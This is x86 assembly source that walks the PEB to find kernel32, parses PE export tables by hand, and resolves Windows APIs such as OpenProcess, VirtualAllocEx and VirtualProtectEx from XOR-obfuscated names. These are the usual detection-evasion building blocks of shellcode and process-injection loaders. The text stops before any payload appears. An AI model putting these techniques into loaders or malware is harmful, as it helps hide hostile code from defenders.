; mem locations of function args are shown assuming the base pointer is setup as usual in prologue

; arg0: src                 [ebp + 8]
; arg1: dst                 [ebp + 12]
; arg2: nBytes              [esp + 16]
memcpy:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; src
    mov edi, [ebp + 12]         ; dst
    mov ecx, [ebp + 16]         ; nBytes

    rep movsb                   ; mov from esi to edi until ecx == 0

.shutdown:
    mov eax, [ebp - 4]          ; return value
    mov esi, [ebp - 8]          ; restore esi
    mov edi, [ebp - 12]         ; restore edi

    leave
    ret 12


; arg0: mem                 [ebp + 8]
; arg1: value               [ebp + 12]
; arg2: count               [ebp + 16]
memset:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = save rdi
        sub esp, 8              ; local variable space

        mov dword [ebp - 4], 0  ; return value
        mov [ebp - 8], edi      ; save edi

        mov edi, [ebp + 8]      ; mem
        mov eax, [ebp + 12]     ; value
        mov ecx, [ebp + 16]     ; count

    .loop:
        stosb

        dec ecx
        jnz .loop
    
    .shutdown:
        mov eax, [ebp - 4]      ; return value
        mov edi, [ebp - 8]      ; restore edi

        leave
        ret 12


; arg0: str                 [ebp + 8]
;
; ret: num chars            eax
strlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = rsi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; str

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsb

            cmp al, 0           ; end of string ?
            jne .loop

.shutdown:
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; output

    leave
    ret 4

; arg0: wstr        [ebp + 8]
;
; ret: num chars    eax
wstrlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = esi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output strlen
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; wstr

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsw

            cmp ax, 0           ; end of string ?
            jne .loop       

.shutdown:
    mov esi, [ebp - 8]          ; save esi
    mov eax, [ebp - 4]          ; strlen

    leave
    ret 4

; arg0: src         [ebp + 8]
; arg1: dst         [ebp + 12]
strcpy:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; src
    mov edi, [ebp + 12]         ; dst

.loop:
    lodsb                       ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
    stosb                       ; storing before checking because we need the zero at the end of the string to be copied too

    cmp al, 0                   ; end of string ?
    je .loop_end                ; yes

    jmp .loop

.loop_end:

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    leave
    ret 8

; arg0: src         [ebp + 8]
; arg1: dst         [ebp + 12]
wstrcpy:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; src
    mov edi, [ebp + 12]         ; dst

.loop:
    lodsw                       ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
    stosw                       ; storing before checking because we need the zero at the end of the string to be copied too

    cmp ax, 0                   ; end of string ?   
    je .loop_end                ; yes

    jmp .loop

.loop_end:

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    leave
    ret 8

; arg0: src         [ebp + 8]
; arg1: dst         [ebp + 12]
wstrcpya:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = save rsi
        ; ebp - 12 = save rdi
        sub esp, 12                     ; local variable space

        mov dword [ebp - 4], 0          ; return value
        mov [ebp - 8], esi              ; save esi
        mov [ebp - 12], edi             ; save edi

        mov esi, [ebp + 8]              ; src
        mov edi, [ebp + 12]             ; dst

    .loop:
        lodsw                           ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
        stosb                           ; storing before checking because we need the zero at the end of the string to be copied too

        cmp ax, 0                       ; end of string ?
        jne .loop                       ; no

    .shutdown:
        mov edi, [ebp - 12]             ; restore edi
        mov esi, [ebp - 8]              ; restore esi
        mov eax, [ebp - 4]              ; return value

        leave
        ret 8

; arg0: src         [ebp + 8]
; arg1: dst         [ebp + 12]
astrcpyw:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = save esi
        ; ebp - 12 = save edi
        sub esp, 12                     ; local variable space

        mov dword [ebp - 4], 0          ; return value
        mov [ebp - 8], esi              ; save esi
        mov [ebp - 12], edi             ; save edi

        mov esi, [ebp + 8]              ; src
        mov edi, [ebp + 12]             ; dst

        xor eax, eax

    .loop:
        lodsb                           ; not using movsb so the byte can be checked if it is 0, and esi advances before check, so check is incorrect
        stosw                           ; storing before checking because we need the zero at the end of the string to be copied too

        cmp al, 0                       ; end of string ?
        jne .loop                       ; no

    .shutdown:
        mov edi, [ebp - 12]
        mov esi, [ebp - 8]
        mov eax, [ebp - 4]

        leave
        ret 8


; arg0: str         [ebp + 8]
; arg1: wstr        [ebp + 12]
;
; ret: 1 if equal   eax
strcmpAW:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str
    mov edi, [ebp + 12]         ; wstr

.loop:
    movzx eax, byte [esi]
    movzx edx, byte [edi]

    cmp al, dl
    jne .loop_end_not_equal

    cmp al, 0                   ; end of string ?
    je .loop_end_equal

    inc esi
    add edi, 2

    jmp .loop

    .loop_end_equal:
        mov dword [ebp - 4], 1
        jmp .shutdown

    .loop_end_not_equal:
        mov dword [ebp - 4], 0
        jmp .shutdown

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; returm value

    leave
    ret 8

; arg0: str         [ebp + 8]
; arg1: wstr        [ebp + 12]
;
; ret: 1 if equal   eax
strcmpiAW:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = esi
    ; ebp - 12 = edi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str
    mov edi, [ebp + 12]         ; wstr

.loop:
    movzx eax, byte [esi]
    movzx edx, byte [edi]

    cmp al, dl

    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    cmp al, 0                   ; end of string ?
    je .loop_end_equal

    inc esi
    add edi, 2

    jmp .loop

    .al_more_than_dl:
        add dl, 32
        cmp al, dl
        
        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov dword [ebp - 4], 0
    jmp .shutdown

.loop_end_equal:
    mov dword [ebp - 4], 1
    jmp .shutdown

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    leave
    ret 8

; arg0: str1        [ebp + 8]
; arg1: str2        [ebp + 12]
;
; ret: 1 if equal   eax
strcmpAA:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space 

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str1
    mov edi, [ebp + 12]         ; str2

    ; cmp successive bytes, and check the esi end of string
    ; if the strings are equal it would be end of both strings
    ; if the strings are unequal the cmpsb would fail

.loop:
    cmpsb
    jne .not_equal

    mov al, [esi]                       ; cannot use lodsb as it incr esi
    cmp al, 0                           ; end of string ?
    je .equal

    jmp .loop

    .not_equal:
        mov dword [ebp - 4], 0        ; return value
        jmp .shutdown

    .equal:
        mov dword [ebp - 4], 1        ; return value
        jmp .shutdown

.shutdown:    
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    leave
    ret 8

; arg0: str         [ebp + 8]
; arg1: wstr        [ebp + 12]
;
; ret: 1 if equal   eax
strcmpiAA:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = rsi
    ; ebp - 12 = rdi
    sub esp, 12                 ; allocate local variable space

    mov dword [ebp - 4], 0      ; return value
    mov [ebp - 8], esi          ; save esi
    mov [ebp - 12], edi         ; save edi

    mov esi, [ebp + 8]          ; str
    mov edi, [ebp + 12]         ; wstr

.loop:
    movzx eax, byte [esi]
    movzx edx, byte [edi]

    cmp al, dl

    jg .al_more_than_dl
    jl .al_less_than_dl

.continue_loop:
    cmp al, 0                   ; end of string ?
    je .loop_end_equal

    inc esi
    inc edi

    jmp .loop

    .al_more_than_dl:
        add dl, 32
        cmp al, dl
        
        jne .loop_end_not_equal
        jmp .continue_loop

    .al_less_than_dl:
        add al, 32
        cmp al, dl

        jne .loop_end_not_equal
        jmp .continue_loop

.loop_end_not_equal:
    mov dword [ebp - 4], 0      ; return value
    jmp .shutdown

.loop_end_equal:
    mov dword [ebp - 4], 1      ; return value
    jmp .shutdown

.shutdown:
    mov edi, [ebp - 12]         ; restore edi
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; return value

    leave
    ret 8

; arg0: str                     [ebp + 8]
; arg1: chr                     [ebp + 12]
;
; ret:  ptr to chr else -1      eax
strchr:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value cRet
    ; ebp - 8 = strlen
    ; ebp - 12 = c
    ; ebp - 16 = ebx
    sub esp, 16                         ; allocate local variable space

    mov dword [ebp - 4], -1             ; cRet
    mov [ebp - 16], ebx                 ; save ebx

    push dword [ebp + 8]                ; str
    call strlen

    mov [ebp - 8], eax                  ; strlen

    mov dword [ebp - 12], 0             ; c = 0
    .loop:
        mov edx, [ebp + 8]              ; str
        mov ebx, [ebp - 12]             ; c

        movzx ecx, byte [edx + ebx]     ; str[c]

        cmp cl, [ebp + 12]              ; str[c] == chr ?
        je .equal

        inc dword [ebp - 12]            ; ++c
        mov eax, [ebp - 8]              ; strlen
        cmp [ebp - 12], eax             ; c < strlen

        jne .loop
        jmp .shutdown

        .equal:
            add edx, ebx                ; str + c
            mov [ebp - 4], edx          ; cRet = str + c

            jmp .shutdown

.shutdown:
    mov eax, [ebp - 4]                  ; return value
    mov ebx, [ebp - 16]                 ; restore ebx

    leave
    ret 8

; arg0: str to find in              [ebp + 8]
; arg1: str to find                 [ebp + 12]
;
; ret: ptr if found, 0 otherwise    eax
str_contains:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = find in str len
        ; ebp - 12 = find str len
        ; ebp - 16 = find in char loop counter
        sub esp, 16                     ; local variable space

        ; init values
        mov dword [ebp - 4], 0          ; return value
        mov dword [ebp - 16], 0         ; find in char loop counter

        ; find find in str len
        push dword [ebp + 8]            ; find in str
        call strlen

        mov [ebp - 8], eax              ; find in str len

        ; find find str len
        push dword [ebp + 12]           ; find str
        call strlen

        mov [ebp - 12], eax             ; find str len

        ; compare each char of the find in str to the find str
        ; and if match is found then see if subsequent chars
        ; match the find str

        mov esi, [ebp + 8]              ; find in str
        mov edi, [ebp + 12]             ; find str

    .loop:
        cmp byte [esi], 0               ; end of find in str ?
        je .shutdown

        mov ecx, [ebp - 12]             ; find str len
        .inner_loop:
            cmpsb

            jne .inner_loop_done

            dec ecx
            jz .find_str_found

            jmp .inner_loop

        .inner_loop_done:
        
        inc dword [ebp - 16]            ; find in char loop counter
        mov edi, [ebp + 12]             ; find str
        mov esi, [ebp + 8]              ; find in str
        add esi, [ebp - 16]             ; find in char loop counter

        jmp .loop

    .find_str_found:
        mov dword [ebp - 4], 1          ; return value


    .shutdown:
        mov eax, [ebp - 4]              ; return value

        leave
        ret 8

; arg0: str to find in              [ebp + 8]
; arg1: str to find                 [ebp + 12]
;
; ret: ptr if found, 0 otherwise    eax
wstr_contains:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = find in str len
        ; ebp - 12 = find str len
        ; ebp - 16 = find in char loop counter
        sub esp, 16                     ; local variable space

        ; init values
        mov dword [ebp - 4], 0          ; return value
        mov dword [ebp - 16], 0         ; find in char loop counter

        ; find find in str len
        push dword [ebp + 8]            ; find in str
        call wstrlen

        mov [ebp - 8], eax              ; find in str len

        ; find find str len
        push dword [ebp + 12]           ; find str
        call wstrlen

        mov [ebp - 12], eax             ; find str len

        ; compare each char of the find in str to the find str
        ; and if match is found then see if subsequent chars
        ; match the find str

        mov esi, [ebp + 8]              ; find in str
        mov edi, [ebp + 12]             ; find str

    .loop:
        cmp byte [esi], 0               ; end of find in str ?
        je .shutdown

        mov ecx, [ebp - 12]             ; find str len
        .inner_loop:
            cmpsw

            jne .inner_loop_done

            dec ecx
            jz .find_str_found

            jmp .inner_loop

        .inner_loop_done:
        
        add dword [ebp - 16], 2         ; find in char loop counter
        mov edi, [ebp + 12]             ; find str
        mov esi, [ebp + 8]              ; find in str
        add esi, [ebp - 16]             ; find in char loop counter

        jmp .loop

    .find_str_found:
        mov dword [ebp - 4], 1          ; return value


    .shutdown:
        mov eax, [ebp - 4]              ; return value

        leave
        ret 8

; arg0: str1            [ebp + 8]
; arg1: str2            [ebp + 12]
str_append:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = str1 len
        sub esp, 8                      ; local variable space
        
        push dword [ebp + 8]            ; str1
        call strlen

        mov [ebp - 8], eax              ; str1 len

        mov eax, [ebp - 8]              ; str1
        add dword [ebp + 8], eax        ; points to the end of str1

        push dword [ebp + 8]                  
        push dword [ebp + 12]           ; str2
        call strcpy

    .shutdown:
        xor eax, eax                    ; return value

        leave
        ret

; arg0: data            [ebp + 8]
; arg1: data_len        [ebp + 12]
; arg2: key             [ebp + 16]
; arg3: key_len         [ebp + 20]
my_xor:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = i
    ; ebp - 12 = j
    ; ebp - 16 = bInput
    ; ebp - 20 = b
    ; ebp - 24 = data_bit_i
    ; ebp - 28 = key_bit_j
    ; ebp - 32 = bit_xor
    ; ebp - 36 = ebx
    sub esp, 36                                 ; allocate local variable space

    mov dword [ebp - 4], 0                      ; return value
    mov dword [ebp - 8], 0                      ; i = 0
    mov dword [ebp - 12], 0                     ; j = 0
    mov [ebp - 36], ebx                         ; save rbx

    .data_loop:
        mov eax, [ebp - 12]                     ; j in eax
        cmp eax, [ebp + 20]                     ; j == key_len ?

        jne .continue_data_loop
        mov dword [ebp - 12], 0                 ; j = 0
        
    .continue_data_loop:
        mov dword [ebp - 16], 0                 ; bInput = 0
        mov dword [ebp - 20], 0                 ; b = 0

        .bit_loop:
        ; bit test data
            mov edx, [ebp + 8]                  ; ptr to data in rdx
            mov ebx, [ebp - 8]                  ; i in rbx

            movzx eax, byte [edx + ebx]         ; data char in al
            movzx ebx, byte [ebp - 20]          ; b in bl

            bt eax, ebx

            jc .data_bit_is_set
            mov dword [ebp - 24], 0             ; data_bit_i = 0
            jmp .bit_loop_continue_data

            .data_bit_is_set:
                mov dword [ebp - 24], 1         ; data_bit_i = 1

        .bit_loop_continue_data:
            ; bit test key

            mov edx, [ebp + 16]                 ; ptr to key in rdx
            mov ebx, [ebp - 12]                 ; j in rbx
            
            movzx eax, byte [edx + ebx]         ; key char in al
            movzx ebx, byte [ebp - 20]          ; b in bl

            bt eax, ebx

            jc .key_bit_is_set
            mov dword [ebp - 28], 0             ; key_bit_i = 0
            jmp .bit_loop_continue_key

            .key_bit_is_set:
                mov dword [ebp - 28], 1         ; key_bit_i = 1

        .bit_loop_continue_key:

            movzx eax, byte [ebp - 24]          ; data_bit_i in al
            cmp al, [ebp - 28]                  ; data_bit_i == key_bit_i ?

            je .bits_equal
            ; bits are unequal
            mov dword eax, 1
            movzx ecx, byte [ebp - 20]          ; b in cl
            shl al, cl
            mov [ebp - 32], al                  ; bit_xor = (data_bit_i != key_bit_j) << b

            jmp .bits_continue
            .bits_equal:
            ; bits equal
            ; so (data_bit_i != key_bit_j) == 0
                mov dword [ebp - 32], 0         ; bit_xor = 0

        .bits_continue:
            movzx eax, byte [ebp - 16]          ; bInput in al
            or al, [ebp - 32]                   ; bInput |= bit_xor

            mov [ebp - 16], al                  ; al to bInput

            inc dword [ebp - 20]                ; ++b
            mov dword eax, [ebp - 20]           ; b in eax
            cmp dword eax, 8                    ; b == 8 ?
            jnz .bit_loop


        mov dword edx, [ebp + 8]                ; ptr to data in rdx
        mov dword ebx, [ebp - 8]                ; i in rbx

        movzx eax, byte [ebp - 16]              ; bInput in al
        mov [edx + ebx], al                     ; data[i] = bInput

        inc dword [ebp - 12]                    ; ++j

        inc dword [ebp - 8]                     ; ++i
        mov eax, [ebp - 8]                      ; i in eax
        cmp eax, [ebp + 12]                     ; i == data_len ?

        jne .data_loop

.shutdown:
    mov ebx, [ebp - 36]                         ; restore rbx
    mov eax, [ebp - 4]                          ; return value

    leave
    ret 16


; ret: kernel module handle     eax
get_kernel_module_handle:
    push ebp
    mov ebp, esp

    ; ebp - 4 = first list entry
    ; ebp - 8 = current list entry
    ; ebp - 12 = table entry
    ; ebp - 16 = kernel mod addr
    sub esp, 16                                 ; allocate local variable space

    push xor_key.len
    push xor_key
    push kernel32_xor.len
    push kernel32_xor
    call my_xor

    mov eax, fs:[0x30]                          ; peb
    add eax, 0xc                                ; *ldr
    mov eax, [eax]                              ; ldr
    add eax, 0x14                               ; InMemoryOrderModuleList

    mov [ebp - 4], eax                          ; *FirstModule
    mov eax, [eax]                              ; FirstModule
    mov [ebp - 8], eax                          ; CurrentModule

.loop:
    cmp eax, [ebp - 4]                          ; CurrentModule == FirstModule ?
    je .loop_end_equal
        sub eax, 8                              ; *TableEntry
        mov [ebp - 12], eax                     ; *TableEntry

        add eax, 0x2c                           ; *BaseDLLName
        add eax, 0x4                            ; BaseDLLName->Buffer

        push dword [eax]                        ; BaseDLLName.Buffer
        push kernel32_xor
        call strcmpiAW

        cmp eax, 1                              ; strings match
        je .module_found

        mov eax, [ebp - 8]                      ; CurrentModule
        mov eax, [eax]                          ; CurrentModule = CurrentMdoule->Flink
        mov [ebp - 8], eax                      ; CurrentModule

        jmp .loop

.module_found:
    mov eax, [ebp - 12]                         ; *TableEntry
    add eax, 0x18                               ; TableEntry->DllBase
    mov eax, [eax]                              ; DllBase 
    mov [ebp - 16], eax                         ; mod addr

    jmp .shutdown

.loop_end_equal:

.shutdown:
    mov eax, [ebp - 16]                         ; mod addr

    leave
    ret


; arg0: base addr           [ebp + 8]
; arg1: proc name           [ebp + 12]
;
; ret:  proc addr           eax
get_proc_address_by_name:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    ; ebp - 8 = nt headers
    ; ebp - 12 = export data directory
    ; ebp - 16 = export directory
    ; ebp - 20 = address of functions
    ; ebp - 24 = address of names
    ; ebp - 28 = address of name ordinals
    ; ebp - 284 = forwarded dll.function name - 256 bytes
    ; ebp - 288 = function name
    ; ebp - 292 = loaded forwarded library addr
    ; ebp - 296 = function name strlen
    ; ebp - 300 = ebx
    ; ebp - 304 = temp var (r8)
    ; ebp - 308 = temp var (r9)
    ; ebp - 312 = temp var (r10)
    ; ebp - 316 = temp var (r11)
    sub esp, 316                                ; allocate local variable space

    mov dword [ebp - 4], 0                      ; return value
    mov [ebp - 300], ebx                        ; save ebx
   
    mov ebx, [ebp + 8]                          ; base addr
    add ebx, 0x3c                               ; *e_lfa_new

    movzx ecx, word [ebx]                       ; e_lfanew

    mov eax, [ebp + 8]                          ; base addr
    add eax, ecx                                ; nt header

    mov [ebp - 8], eax                          ; nt header

    add eax, 24                                 ; optional header
    add eax, 96                                 ; export data directory

    mov [ebp - 12], eax                         ; export data directory

    mov eax, [ebp + 8]                          ; base addr
    mov ecx, [ebp - 12]                         ; export data directory
    mov ebx, [ecx]
    add eax, ebx                                ; export directory

    mov [ebp - 16], eax                         ; export directory

    add eax, 28                                 ; address of functions rva
    mov eax, [eax]                              ; rva in eax
    add eax, [ebp + 8]                          ; base addr + address of function rva

    mov [ebp - 20], eax                         ; address of functions

    mov eax, [ebp - 16]                         ; export directory
    add eax, 32                                 ; address of names rva
    mov eax, [eax]                              ; rva in eax
    add eax, [ebp + 8]                          ; base addr + address of names rva

    mov [ebp - 24], eax                         ; address of names

    mov eax, [ebp - 16]                         ; export directory
    add eax, 36                                 ; address of name ordinals
    mov eax, [eax]                              ; rva in eax
    add eax, [ebp + 8]                          ; base addr + address of name ordinals

    mov [ebp - 28], eax                         ; address of name ordinals

    mov eax, [ebp - 16]
    mov [ebp - 312], eax                        ; export directory
    add dword [ebp - 312], 12                   ; number of names
    mov eax, ebp
    sub eax, 312
    mov eax, [eax]
    mov [ebp - 312], eax                        ; number of names in [ebp - 312]

    mov dword [ebp - 316], 0                    ; index
.loop_func_names:
    ; to index into an array, we multiply the size of each element with the 
    ; current index and add it to the base addr of the array
    mov dword eax, 4                            ; size of dword
    mul dword [ebp - 316]                       ; size * index
    mov ebx, [ebp - 24]                         ; address of names
    add ebx, eax                                ; address of names + n
    mov ebx, [ebx]                              ; address of names [n]

    add ebx, [ebp +  8]                         ; base addr + address of names [n]

    push ebx                                    ; base addr + address of names [n]
    push dword [ebp + 12]                       ; proc name arg
    call strcmpiAA

    cmp eax, 1                                  ; are strings equal
    je .function_found

    inc dword [ebp - 316]
    mov eax, [ebp - 312]
    cmp [ebp - 316], eax
    jne .loop_func_names

    jmp .shutdown

.function_found:
    mov eax, 2                                  ; size of ordinal value
    mul dword [ebp - 316]                       ; index * size of element of addrees of name ordinals(word)
    add eax, [ebp - 28]                         ; address of name ordinals + n
    movzx eax, word [eax]                       ; address of name ordinals [n]; index into address of functions

    mov ebx, 4                                  ; size of element of address of functions(dword)
    mul ebx                                     ; index * size of element
    add eax, [ebp - 20]                         ; address of functions + index
    mov eax, dword [eax]                        ; address of functions [index]

    add eax, [ebp + 8]                          ; base addr + address of functions [index]

    mov [ebp - 4], eax                          ; proc addr (return value)

    ; check if the function is forwarded
    mov eax, [ebp + 8]
    mov [ebp - 304], eax                        ; base addr
    mov eax, [ebp - 12]                         ; export data directory
    mov eax, [eax]                              ; export data directory virtual address
    add [ebp - 304], eax                        ; base addr + virtual addr

    mov eax, [ebp - 304]
    mov [ebp - 308], eax
    mov eax, [ebp - 12]                         ; export data directory
    add eax, 4                                  ; export data directory size
    mov eax, [eax]                              ; export data directory size
    add [ebp - 308], eax                        ; base addr + virtual addr + size

    mov eax, [ebp - 304]
    cmp [ebp - 4], eax                          ; below the start of the export directory
    jl .shutdown                                ; not forwarded
    ; or
    mov eax, [ebp - 308]
    cmp [ebp - 4], eax                          ; above the end of the export directory
    jg .shutdown                                ; not forwarded

    ; make a copy of the string of the forwarded dll
    mov eax, ebp
    sub eax, 284
    push eax
    push dword [ebp - 4]                        ; proc addr (return value)
    call strcpy

    ; find the position of the '.' which separates the dll name and function name
    push dword  '.'
    mov eax, ebp
    sub eax, 284
    push eax
    call strchr                                 ; ptr to chr in eax
    
    mov byte [eax], 0                           ; replade the '.' with 0
    inc eax

    mov [ebp - 288], eax                        ; forwarded function name

    cmp dword [load_library_a], 0               ; is load_library_a proc available
    je .error_shutdown

    mov eax, ebp
    sub eax, 284
    push eax
    call [load_library_a]                       ; library addr

    mov [ebp - 292], eax                        ; library addr

    push dword [ebp - 288]
    call strlen                                 ; strlen in eax

    mov [ebp - 296], eax                        ; function name len

    push dword [ebp - 296]                      ; function name len
    push dword [ebp - 288]                      ; function name
    push dword [ebp - 292]                      ; loaded library addr
    call get_proc_address_by_name               ; proc addr

    mov [ebp - 4], eax                          ; proc addr

    jmp .shutdown

.error_shutdown:
    mov dword [ebp - 4], 0                      ; proc addr not found

.shutdown:
    mov ebx, [ebp - 300]                        ; restore ebx
    mov eax, [ebp - 4]                          ; return value

    leave
    ret 8

; arg0: base addr               [ebp + 8]
; arg1: xor str                 [ebp + 12]
; arg2: xor str len             [ebp + 16]
; arg3: is get proc addr        [ebp + 20]
;
; return: proc addr             eax
unxor_and_get_proc_addr:
    push ebp
    mov ebp, esp

    ; ebp - 4 = return value
    sub esp, 4                                  ; allocate local variable space

    mov dword [ebp - 4], 0                      ; return value

    push xor_key.len
    push xor_key
    push dword [ebp + 16]                       ; xor str key
    push dword [ebp + 12]                       ; xor str
    call my_xor

    cmp dword [ebp + 20], 1                     ; is get proc addr
    jne .not_get_proc_addr
        push dword [ebp + 16]                   ; xor str len
        push dword [ebp + 12]                   ; xor str
        push dword [ebp + 8]                    ; base addr
        call get_proc_address_by_name

        mov [ebp - 4], eax                      ; return value

        jmp .shutdown

.not_get_proc_addr:
    push dword [ebp + 12]                       ; xor str
    push dword [ebp + 8]                        ; base addr
    call [get_proc_address]

    mov [ebp - 4], eax                          ; return value

    jmp .shutdown

.shutdown:
    mov eax, [ebp - 4]                          ; return value

    leave
    ret 16

; arg0: kernel base addr        ebp + 8
populate_kernel_function_ptrs_by_name:
    push ebp
    mov ebp, esp

    push dword 1
    push get_proc_address_xor.len
    push get_proc_address_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_proc_address], eax                    ; GetProcAddress addr

    push dword 0
    push dword get_last_error_xor.len
    push dword get_last_error_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_last_error], eax                   ; GetLastError addr

    push dword 0
    push dword load_library_a_xor.len
    push dword load_library_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [load_library_a], eax                   ; LoadLibraryA addr

    push dword 0
    push dword get_module_handle_a_xor.len
    push dword get_module_handle_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_module_handle_a], eax              ; GetModuleHandleA addr

    push dword 0
    push dword get_current_process_xor.len
    push dword get_current_process_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_current_process], eax              ; GetCurrentProcess addr

    push dword 0
    push dword get_std_handle_xor.len
    push dword get_std_handle_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_std_handle], eax                   ; GetStdHandle addr

    push dword 0
    push dword open_process_xor.len
    push dword open_process_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [open_process], eax                     ; OpenProcess addr

    push dword 0
    push dword open_file_xor.len
    push dword open_file_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [open_file], eax                        ; OpenFile addr

    push dword 0
    push dword get_file_size_xor.len
    push dword get_file_size_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [get_file_size], eax                    ; GetFileSize addr

    push dword 0
    push dword create_file_a_xor.len
    push dword create_file_a_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [create_file_a], eax                    ; CreateFileA addr

    push dword 0
    push dword read_file_xor.len
    push dword read_file_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [read_file], eax                        ; ReadFile addr

    push dword 0
    push dword write_file_xor.len
    push dword write_file_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [write_file], eax                       ; WriteFile addr

    push dword 0
    push dword virtual_alloc_xor.len
    push dword virtual_alloc_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc], eax                    ; VirtualAlloc addr

    push dword 0
    push dword virtual_alloc_ex_xor.len
    push dword virtual_alloc_ex_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_alloc_ex], eax                 ; VirtualAllocEx addr

    push dword 0
    push dword virtual_free_xor.len
    push dword virtual_free_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_free], eax                     ; VirtualFree addr

    push dword 0
    push dword virtual_free_ex_xor.len
    push dword virtual_free_ex_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_free_ex], eax                  ; VirtualFreeEx addr

    push dword 0
    push dword virtual_protect_xor.len
    push dword virtual_protect_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect], eax                  ; VirtualProtect addr

    push dword 0
    push dword virtual_protect_ex_xor.len
    push dword virtual_protect_ex_xor
    push dword [ebp + 8]
    call unxor_and_get_proc_addr                ; proc addr

    mov [virtual_protect_ex], eax               ; VirtualProtectEx addr

